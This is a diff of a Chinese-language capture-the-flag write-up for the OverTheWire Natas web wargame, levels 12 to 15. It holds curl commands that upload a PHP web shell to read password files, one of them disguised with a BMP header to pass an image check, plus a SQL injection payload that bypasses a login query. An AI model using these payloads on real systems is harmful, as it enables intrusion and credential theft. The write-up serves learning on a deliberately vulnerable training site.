@@ -2,7 +2,7 @@
 
 ## 0-1
 
-基本的开源代码方法：右键--查看网页源代码。
+基本的看源代码方法：右键--查看网页源代码。
 
 ## 1-2
 
@@ -156,3 +156,46 @@ setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
 把`no`改成`yes`加密以后用`curl`上传。
 
 **结论**：再一次证实，双向的加密方式如果公开就等同于摆设。
+
+## 12-13
+
+发现可以上传一个`JPEG`。
+
+```php
+$ext = pathinfo($fn, PATHINFO_EXTENSION); 
+```
+
+这句话说明上传文件的后缀名是由`filename`决定的，而直接上传会被钦点命名为`jpg`。
+
+所以用`curl`上次一个`php`去读密码就好了
+
+```bash
+curl -isu natas12:*** 'http://natas12.natas.labs.overthewire.org' -F filename=a.php -F "uploadedfile=@-;filename=a.php" <<< '<?php passthru("cat etc/natas_webpass/natas13"); ?>'
+```
+
+##  13-14
+
+发现这次会用`exif_imagetype`来检查文件是否是文件。
+
+我们知道图像文件都是有一个特殊的头的，`exif_imagetype`就是检查头。
+
+把`php`伪装即可，最方便的是`bmp`文件，开头加上`BM`就行了。
+
+```bash
+curl -isu natas13:****** 'http://natas13.natas.labs.overthewire.org' -F filename=a.php -F "uploadedfile=@-;filename=a.php" <<< 'BM<?php passthru("cat etc/natas_webpass/natas14"); ?>'
+```
+
+**结论**：上传文件要控制住类型。
+
+## 14-15
+
+发现要输密码，实际上是干了什么呢？是把一个字符串传入`mysql_query()`了。
+
+字符串长这样：
+
+```php
+"SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\""
+```
+
+所以让这个`query`强制从中间断开然后使其直接成立，比如设定`username='" or 1 #'`，其中`#`用来把后面直接变成注释。
+
